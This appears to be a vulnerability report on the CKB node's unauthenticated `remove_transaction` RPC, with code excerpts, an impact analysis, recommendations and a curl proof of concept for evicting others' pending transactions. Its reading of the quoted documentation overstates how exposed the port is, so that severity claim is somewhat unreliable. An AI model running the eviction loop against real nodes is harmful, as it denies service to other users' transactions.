### Title
Unauthenticated `remove_transaction` RPC Allows Any Caller to Evict Any Pending Transaction from the Pool — (`rpc/src/module/pool.rs`)

### Summary
The `remove_transaction` JSON-RPC method in CKB's Pool module performs no caller identity or ownership verification. Any entity that can reach the RPC endpoint can remove any pending transaction submitted by any other user, enabling a targeted or blanket denial-of-service against the transaction pool.

### Finding Description
The `remove_transaction` implementation in `rpc/src/module/pool.rs` accepts a `tx_hash` and unconditionally evicts the matching transaction (and all its descendants) from the pool:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
``` [1](#0-0) 

There is no check that the caller is the submitter of the transaction, no authentication token, and no role gate. The RPC server itself carries no per-method authentication layer — the grep across all of `rpc/src/` returns zero matches for any auth/credential/token enforcement. [2](#0-1) 

The Pool module is enabled by default in the production configuration:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
``` [3](#0-2) 

The only network-level guard is that the RPC binds to `127.0.0.1:8114` by default. There is no HTTP Basic Auth, bearer token, or any other credential check enforced by the server. [4](#0-3) 

Internally, `remove_local_tx` flows through `TxPoolController` → `service.rs` `Message::RemoveLocalTx` → `service.remove_tx` → `pool_map.remove_entry_and_descendants`, which removes the target transaction and every descendant unconditionally. [5](#0-4) [6](#0-5) 

### Impact Explanation
An attacker with RPC access can:
1. Watch the pool (via `get_raw_tx_pool`) for newly submitted transactions.
2. Immediately call `remove_transaction` for each observed `tx_hash`.
3. Evict every pending and proposed transaction — including those submitted by other users — before they are committed to a block.

This is a complete denial-of-service against the transaction pool: no user transaction can survive long enough to be mined. Because descendants are also removed, a single call can cascade and evict entire transaction chains.

### Likelihood Explanation
The RPC is localhost-only by default, but:
- The official documentation explicitly warns that many operators expose it to wider networks: *"Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged."* [7](#0-6) 
- Any local process on the node host (co-located application, compromised dependency, shared-hosting tenant) can reach `127.0.0.1:8114` without any credential.
- The `Pool` module — which includes `remove_transaction` — is enabled by default with no opt-in required.
- The attack requires only the ability to send an HTTP POST to the RPC port, which is within the explicitly listed attacker profile of "RPC caller."

### Recommendation
- **Short term:** Add a submitter-identity check: record the source identity (IP, API key, or a node-local session token) when a transaction is submitted via `send_transaction`, and reject `remove_transaction` calls that do not match the recorded submitter. At minimum, gate `remove_transaction` behind a separate, opt-in RPC module (e.g., `PoolAdmin`) that operators must explicitly enable and protect.
- **Long term:** Introduce per-method authentication to the RPC server (e.g., HTTP Basic Auth or a bearer-token middleware) so that destructive pool-management operations (`remove_transaction`, `clear_tx_pool`, `clear_tx_verify_queue`) are only reachable by authenticated operators, not by any process that can open a TCP connection to the RPC port.

### Proof of Concept
```
# Step 1: Alice submits a transaction
curl -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":[<alice_tx>, "passthrough"]}'
# Returns: {"result": "0xALICE_TX_HASH"}

# Step 2: Attacker (any local process) polls the pool
curl -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns pool contents including 0xALICE_TX_HASH

# Step 3: Attacker removes Alice's transaction — no credential required
curl -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"remove_transaction","params":["0xALICE_TX_HASH"]}'
# Returns: {"result": true}
# Alice's transaction is gone from the pool with no recourse.
```

A bot repeating steps 2–3 in a tight loop prevents any transaction from ever being committed, constituting a sustained DoS on the CKB transaction pool. [1](#0-0)
